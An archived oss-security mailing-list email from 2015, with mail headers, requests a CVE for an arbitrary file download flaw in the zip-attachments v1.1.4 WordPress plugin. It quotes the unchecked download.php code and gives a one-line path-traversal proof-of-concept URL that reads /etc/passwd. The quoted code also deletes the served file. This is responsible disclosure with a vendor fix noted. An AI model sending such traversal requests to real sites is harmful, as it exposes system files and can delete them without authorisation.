X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1296" "Friday" "12" "June" "2015" "14:35:16" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<86C35E8E-96DD-40C0-8530-1F426328CE21@me.com>" "40" "[oss-security] zip-attachments v1.1.4 wordpress plugin arbitrary file download vulnerability." nil nil nil "6" "2015061218:35:16" "[oss-security] zip-attachments v1.1.4 wordpress plugin arbitrary file download vulnerability." (number mark "        larry0@me.co Jun 12   40/1296  " thread-indent "\"[oss-security] zip-attachments v1.1.4 wordpress plugin arbitrary file download vulnerability.\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 14246 invoked by uid 550); 12 Jun 2015 18:35:34 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 14204 invoked from network); 12 Jun 2015 18:35:30 -0000
X-Proofpoint-Virus-Version: vendor=fsecure
 engine=2.50.10432:5.14.151,1.0.33,0.0.0000
 definitions=2015-06-12_05:2015-06-11,2015-06-12,1970-01-01 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
 reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1506120320
Content-type: text/plain; charset=us-ascii
Content-transfer-encoding: quoted-printable
Message-id: <86C35E8E-96DD-40C0-8530-1F426328CE21@me.com>
MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
X-Mailer: Apple Mail (2.2098)
Date: Fri, 12 Jun 2015 14:35:16 -0400
From: "Larry W. Cashdollar" <larry0@me.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] zip-attachments v1.1.4 wordpress plugin arbitrary file download
 vulnerability.
To: Open Source Security <oss-security@lists.openwall.com>

May I please have a CVE for this issue:

Title: zip-attachments v1.1.4 wordpress plugin arbitrary file download vuln=
erability.
Author: Larry W. Cashdollar
Date: 6/10/2015
Vendor: Rick Torres @ricard_dev
Vendor Notified: 6/11/2015
Fixed in:  v1.1.5  by vendor.
Download: https://wordpress.org/plugins/zip-attachments/
CVEID: TBD
Description: Simple and lightweight plugin to add a "Download" button to yo=
ur posts, pages or custom post types.

Vulnerability: zip-attachments allows arbitrary file downloads because it d=
oesn't check the download path of the requested file.

In zip-attachments/download.php, there is no check to see if the file is ou=
tside of the intended download path:

  8 if(isset($_REQUEST['za_file']) && !empty($_REQUEST['za_file'])){
  9=20
 10     $file =3D $_GET['za_file'];
 11     $filename =3D $_GET['za_filename'];
 12=20
 13     header('Content-Type: application/zip');
 14     header('Content-Length: ' . filesize($file));
 15     header('Content-Disposition: attachment; filename=3D"'.$filename.'.=
zip"');
 16=20
 17     readfile($file);
 18     unlink($file);

Any file readable by the httpd process can be downloaded.

PoC:
http://www.example.com/wp-content/plugins/zip-attachments/download.php?za_f=
ile=3D../../../../../etc/passwd&za_filename=3Dpasswd


